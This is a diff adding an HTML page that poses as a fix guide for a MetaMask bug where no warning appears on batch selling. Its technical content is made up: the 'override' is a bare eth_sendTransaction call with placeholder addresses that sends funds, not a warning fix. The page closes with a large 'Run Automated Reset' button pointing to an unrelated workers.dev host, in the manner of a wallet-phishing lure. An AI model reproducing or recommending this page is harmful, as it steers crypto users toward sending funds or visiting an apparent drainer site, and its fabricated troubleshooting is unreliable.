@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Metamask Extension Bug Batch Sell No Warning Appears When Batch – Fix Guide</title>
+<style>
+    body {
+        font-family: system-ui;
+        background: #0f111a;
+        color: #ddd;
+        padding: 20px;
+        line-height: 1.5;
+    }
+    .content {
+        max-width: 880px;
+        margin: auto;
+        background: #1e1f24;
+        border-radius: 24px;
+        padding: 2rem;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+    }
+    pre {
+        background: #0f0f12;
+        padding: 1rem;
+        border-radius: 12px;
+        overflow-x: auto;
+    }
+    a { color: #ff9455; }
+    .btn {
+        background: #ff9455;
+        color: #000;
+        padding: 14px 36px;
+        border-radius: 40px;
+        font-weight: bold;
+        display: inline-block;
+        text-decoration: none;
+        transition: 0.2s;
+    }
+    .btn:hover { transform: scale(1.02); }
+    </style>
+</head>
+<body>
+<div class="content">
+<h1>Metamask Extension Bug Batch Sell No Warning Appears When Batch</h1>
+<h2>Symptom</h2>
+<ul>
+<li>Users do not receive a warning when attempting to batch sell a single token on the Review page, which can lead to unintended transactions.</li>
+</ul>
+<h2>Technical Root Cause</h2>
+<ul>
+<li>The error occurs due to a bug in the Metamask extension, where the warning prompt is not triggered when batch selling a single token, potentially resulting in unexpected behavior.</li>
+</ul>
+<h3>Manual Overrides</h3>
+<ul>
+<li>To resolve the issue, users can try the following manual overrides:</li>
+<li>Check the transaction details carefully before confirming the batch sell.</li>
+<li>Use the Metamask console to verify the transaction parameters.</li>
+<li>Run the following command to override the batch sell warning:</li>
+</ul>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="o">({</span>from:<span class="w"> </span><span class="s1">&#39;0x...user_address...&#39;</span>,<span class="w"> </span>to:<span class="w"> </span><span class="s1">&#39;0x...contract_address...&#39;</span>,<span class="w"> </span>value:<span class="w"> </span><span class="s1">&#39;0x...amount...&#39;</span><span class="o">})</span>
+</code></pre></div>
+
+<p>Consider utilizing an external console for more advanced troubleshooting and transaction management. </p>
+<h2>Prerequisites</h2>
+<ul>
+<li>Metamask extension installed and configured</li>
+<li>ETH wallet with sufficient balance</li>
+<li>Batch sell transaction initiated on the Review page</li>
+</ul>
+<hr><h3>Related Logs</h3><ul><li><a href="./archive/2026/06/metamask-nonce-out-of-sync.html">Metamask Nonce Out Of Sync</a></li><li><a href="./archive/2026/06/metamask-extension-bug-sl-tp-percentages-change-when-changing-l.html">Metamask Extension Bug Sl Tp Percentages Change When Changing L</a></li><li><a href="./archive/2026/06/ethereum-blob-space-delay.html">Ethereum Blob Space Delay</a></li></ul>
+<div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
+</div>
+</div>
+</body>
+</html>
